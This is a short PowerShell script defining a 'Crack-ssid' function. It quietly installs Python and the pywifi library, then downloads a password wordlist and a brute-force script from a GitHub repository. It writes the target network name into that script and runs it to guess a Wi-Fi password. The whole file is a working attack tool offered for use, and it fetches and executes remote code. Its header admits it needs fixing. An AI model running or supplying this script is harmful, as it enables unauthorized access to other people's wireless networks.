# Needs updating and fixing..

function Crack-ssid {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ssid
    )

    # Step 1: Check if Python is installed
    $pythonInstalled = Get-Command python -ErrorAction SilentlyContinue

    if (-not $pythonInstalled) {
        # Python is not installed, proceed with installation

        # Download Python and pip
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" -OutFile "$env:TEMP\python-3.9.7-amd64.exe"
        Start-Process -FilePath "$env:TEMP\python-3.9.7-amd64.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    }

    pip install comtypes pywifi
    pip3 install comtypes pywifi

    # Step 3: Download pass.txt file
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt" -OutFile "$env:TEMP\pass.txt"

    # Step 4: Download flipper.py file and amend the ssid
    $pythonScriptPath = "$env:TEMP\flipper.py"
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py" -OutFile $pythonScriptPath
    (Get-Content -Path $pythonScriptPath) | ForEach-Object {$_ -replace "YOUR_SSID_HERE", "$ssid"} | Set-Content -Path $pythonScriptPath

    # Step 5: Run the python script
    python $pythonScriptPath
}

# Crack-ssid -ssid "YOUR SSID"
